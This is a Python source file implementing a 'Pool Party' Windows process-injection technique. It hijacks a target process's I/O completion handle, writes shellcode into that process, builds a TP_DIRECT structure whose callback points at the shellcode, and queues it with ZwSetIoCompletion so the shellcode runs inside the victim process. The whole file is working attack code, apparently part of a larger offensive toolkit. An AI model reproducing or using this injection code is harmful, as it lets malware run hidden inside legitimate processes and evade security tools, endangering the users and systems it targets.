from pool_party import *
from write_shellcode import *


class RemoteTPDirectInsertion(PoolParty):
    def __init__(self, process):
        super().__init__(process)
        self.process_handle = HANDLE(0)
        self.handle_io_completion = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.handle_io_completion = self.hijack_process_handle(IO_COMPLETION_OBJECT_NAME,
                                                               ULONG(IO_COMPLETION_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        tp_direct_ptr = (c_ubyte * SIZE_OF_TP_DIRECT_STRUCT)()
        callback = convert_buffer_to_struct(tp_direct_ptr, c_uint64, 0x38)
        callback.value = self.shellcode_address

        remote_direct_address = VirtualAllocEx(self.process_handle, None, SIZE_OF_TP_DIRECT_STRUCT,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if remote_direct_address is None:
            logging.error("[-] VirtualAllocEx for Remote Direct failed with Error Code %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_direct_address, byref(tp_direct_ptr), SIZE_OF_TP_DIRECT_STRUCT, None):
            logging.error("[-] WriteProcessMemory for Remote Direct failed with Error Code %d" % GetLastError())
            return False

        nt_status = ZwSetIoCompletion(self.handle_io_completion, remote_direct_address, 0, 0, 0)
        if nt_status != 0:
            logging.error("[-] ZwSetIoCompletion for Remote Direct Failed with NTSTATUS {:x}".format(nt_status))
            return False

        logging.info("[+] Executing shellcode....")
